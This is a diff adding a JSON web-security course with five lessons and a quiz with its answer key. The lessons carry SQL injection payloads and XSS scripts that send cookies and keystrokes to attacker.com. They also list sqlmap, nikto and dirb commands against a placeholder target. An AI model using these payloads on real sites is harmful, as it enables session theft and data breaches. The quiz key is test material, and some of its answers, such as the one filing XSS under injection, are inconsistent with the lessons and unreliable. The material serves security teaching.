@@ -1,0 +1,104 @@
+{
+  "id": 3,
+  "title": "Web Application Security",
+  "duration": "5 hours",
+  "modules": [
+    {
+      "id": 1,
+      "title": "Introduction to Web Security",
+      "duration": "40 min",
+      "content": "## Web Application Security Fundamentals\n\nWeb applications are prime targets for attackers due to their accessibility and the sensitive data they handle.\n\n### Common Web Vulnerabilities (OWASP Top 10)\n\n1. **Injection** - SQL, NoSQL, OS command injection\n2. **Broken Authentication** - Session management flaws\n3. **Sensitive Data Exposure** - Inadequate encryption\n4. **XML External Entities (XXE)** - Malicious XML processing\n5. **Broken Access Control** - Unauthorized access\n6. **Security Misconfiguration** - Default settings\n7. **Cross-Site Scripting (XSS)** - Malicious scripts\n8. **Insecure Deserialization** - Object manipulation\n9. **Using Components with Known Vulnerabilities**\n10. **Insufficient Logging & Monitoring**\n\n### HTTP Protocol Basics\n\n```\nGET /page HTTP/1.1\nHost: example.com\nCookie: session=abc123\n```\n\n### Security Headers\n\n- `Content-Security-Policy` - Prevent XSS\n- `X-Frame-Options` - Prevent clickjacking\n- `Strict-Transport-Security` - Force HTTPS"
+    },
+    {
+      "id": 2,
+      "title": "SQL Injection Attacks",
+      "duration": "50 min",
+      "content": "## Understanding SQL Injection\n\nSQL injection occurs when user input is incorrectly filtered or not parameterized, allowing attackers to execute arbitrary SQL commands.\n\n### Types of SQL Injection\n\n**In-band SQLi**\n- Error-based - Uses error messages\n- Union-based - Combines results\n\n**Blind SQLi**\n- Boolean-based - True/false responses\n- Time-based - Response delays\n\n### Basic Examples\n\n```sql\n-- Authentication bypass\n' OR '1'='1' --\n\n-- Union attack\n' UNION SELECT username, password FROM users --\n\n-- Time-based blind\n' OR SLEEP(5) --\n```\n\n### Prevention\n\n1. **Parameterized Queries**\n```python\ncursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))\n```\n\n2. **Input Validation**\n3. **Least Privilege** - Limit database permissions\n4. **WAF** - Web Application Firewall"
+    },
+    {
+      "id": 3,
+      "title": "Cross-Site Scripting (XSS)",
+      "duration": "50 min",
+      "content": "## Cross-Site Scripting Attacks\n\nXSS allows attackers to inject malicious scripts into web pages viewed by other users.\n\n### Types of XSS\n\n**Reflected XSS**\n- Script in URL parameters\n- Executed immediately\n\n**Stored XSS**\n- Script saved in database\n- Affects all viewers\n\n**DOM-based XSS**\n- Client-side execution\n- Manipulates DOM\n\n### Attack Examples\n\n```javascript\n// Cookie stealing\n<script>document.location='http://attacker.com/?c='+document.cookie</script>\n\n// Keylogger\n<script>document.onkeypress=function(e){new Image().src='http://attacker.com/?k='+e.key;}</script>\n```\n\n### Prevention\n\n1. **Output Encoding** - Escape HTML entities\n2. **Content Security Policy**\n```\nContent-Security-Policy: script-src 'self'\n```\n3. **HttpOnly Cookies** - Prevent JS access\n4. **Input Validation** - Whitelist allowed characters"
+    },
+    {
+      "id": 4,
+      "title": "Authentication & Session Management",
+      "duration": "45 min",
+      "content": "## Secure Authentication\n\nAuthentication vulnerabilities can lead to account takeover and data breaches.\n\n### Common Vulnerabilities\n\n- Weak passwords\n- Credential stuffing\n- Session fixation\n- Session hijacking\n- Insecure password reset\n\n### Secure Session Management\n\n```python\n# Generate secure session ID\nimport secrets\nsession_id = secrets.token_hex(32)\n\n# Set secure cookie flags\nSet-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict\n```\n\n### Best Practices\n\n1. **Multi-factor Authentication**\n2. **Account Lockout** - After failed attempts\n3. **Secure Password Storage**\n```python\nimport bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt())\n```\n4. **Session Timeout** - Expire inactive sessions\n5. **Regenerate Session ID** - After login"
+    },
+    {
+      "id": 5,
+      "title": "Web Security Testing Tools",
+      "duration": "45 min",
+      "content": "## Security Testing Tools\n\nLearn to use professional tools for web application security testing.\n\n### Burp Suite\n\nIntercepting proxy for web testing:\n- Proxy - Intercept requests\n- Repeater - Modify and resend\n- Intruder - Automated attacks\n- Scanner - Vulnerability detection\n\n### OWASP ZAP\n\nOpen-source alternative:\n- Automated scanning\n- Manual testing\n- Fuzzing capabilities\n\n### Command-line Tools\n\n```bash\n# SQLMap - SQL injection\nsqlmap -u \"http://target.com/page?id=1\" --dbs\n\n# Nikto - Web scanner\nnikto -h http://target.com\n\n# Dirb - Directory bruteforce\ndirb http://target.com /usr/share/wordlists/dirb/common.txt\n```\n\n### Testing Methodology\n\n1. **Reconnaissance** - Gather information\n2. **Mapping** - Identify attack surface\n3. **Discovery** - Find vulnerabilities\n4. **Exploitation** - Verify vulnerabilities\n5. **Reporting** - Document findings"
+    }
+  ],
+  "assessment": {
+    "passing_score": 80,
+    "max_attempts": 3,
+    "retry_delay_hours": 24,
+    "questions": [
+      {
+        "id": 1,
+        "question": "Which type of SQL injection uses time delays to extract data?",
+        "options": ["Error-based", "Union-based", "Time-based blind", "Reflected"],
+        "correct": 2
+      },
+      {
+        "id": 2,
+        "question": "What is the best defense against SQL injection?",
+        "options": ["Input validation only", "Parameterized queries", "Escaping quotes", "Using HTTPS"],
+        "correct": 1
+      },
+      {
+        "id": 3,
+        "question": "Which XSS type stores malicious scripts in the database?",
+        "options": ["Reflected XSS", "Stored XSS", "DOM-based XSS", "Blind XSS"],
+        "correct": 1
+      },
+      {
+        "id": 4,
+        "question": "What HTTP header helps prevent XSS attacks?",
+        "options": ["X-Frame-Options", "Content-Security-Policy", "Cache-Control", "Accept-Encoding"],
+        "correct": 1
+      },
+      {
+        "id": 5,
+        "question": "Which cookie flag prevents JavaScript access?",
+        "options": ["Secure", "SameSite", "HttpOnly", "Path"],
+        "correct": 2
+      },
+      {
+        "id": 6,
+        "question": "What tool is commonly used for intercepting web traffic?",
+        "options": ["Nmap", "Burp Suite", "Wireshark", "Metasploit"],
+        "correct": 1
+      },
+      {
+        "id": 7,
+        "question": "Which OWASP Top 10 category includes XSS?",
+        "options": ["Injection", "Broken Authentication", "Cross-Site Scripting", "Security Misconfiguration"],
+        "correct": 0
+      },
+      {
+        "id": 8,
+        "question": "What should be done to session IDs after user login?",
+        "options": ["Delete them", "Regenerate them", "Encrypt them", "Share them"],
+        "correct": 1
+      },
+      {
+        "id": 9,
+        "question": "Which attack exploits trust between user and website?",
+        "options": ["SQL Injection", "XSS", "CSRF", "Directory traversal"],
+        "correct": 1
+      },
+      {
+        "id": 10,
+        "question": "What is the purpose of a WAF?",
+        "options": ["Encrypt traffic", "Filter malicious requests", "Store passwords", "Generate reports"],
+        "correct": 1
+      }
+    ]
+  }
+}
